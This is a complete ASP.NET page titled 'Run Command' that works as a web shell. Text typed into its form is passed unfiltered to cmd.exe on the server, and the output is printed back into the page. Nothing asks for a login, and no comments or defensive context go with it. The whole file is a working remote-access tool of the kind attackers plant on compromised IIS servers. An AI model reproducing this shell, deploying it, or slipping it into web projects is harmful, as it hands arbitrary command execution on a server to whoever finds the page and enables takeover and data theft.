<%@ Page Language="C#" %>
<!DOCTYPE html>
<html>
<head><title>Run Command</title></head>
<body>
    <form id="f" runat="server">
        <input type="text" id="c" runat="server" placeholder="Enter command"/>
        <input type="submit" value="Run Command"/>
    </form>
    <script runat="server">
        protected void Page_Load(object sender, EventArgs e) {
            if (IsPostBack) {
                string cmd = c.Value;
                if (!string.IsNullOrEmpty(cmd)) {
                    var p = new System.Diagnostics.ProcessStartInfo("cmd.exe", "/c " + cmd) {
                        RedirectStandardOutput = true,
                        UseShellExecute = false,
                        CreateNoWindow = true
                    };
                    var process = System.Diagnostics.Process.Start(p);
                    Response.Write("<pre>" + Server.HtmlEncode(process.StandardOutput.ReadToEnd()) + "</pre>");
                }
            }
        }
    </script>
</body>
</html>
